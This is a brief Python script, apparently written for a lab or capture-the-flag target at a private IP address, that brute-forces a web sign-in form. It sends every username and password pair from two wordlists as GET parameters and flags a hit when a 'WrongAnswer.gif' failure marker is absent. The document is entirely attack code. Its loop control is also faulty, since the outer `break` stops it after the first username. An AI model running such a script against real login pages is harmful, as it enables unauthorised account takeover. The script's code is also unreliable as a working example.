import requests

url = "http://192.168.1.32/?page=signin"

with open('usernames.txt', 'r') as user_file:
  usernames = [line.strip() for line in user_file]
with open('passwords.txt', 'r') as pass_file:
  passwords = [line.strip() for line in pass_file]

for username in usernames:
  for password in passwords:
    params = {
        "page": "signin",
        "username": username,
        "password": password,
        "Login": "Login"
    }

    print(f"Try username={username}, password={password}")

    response = requests.get(url, params=params)

    if "images/WrongAnswer.gif" not in response.text:
      print(f"Valid credentials found: {username}:{password}")
      break
    else:
      continue
    break
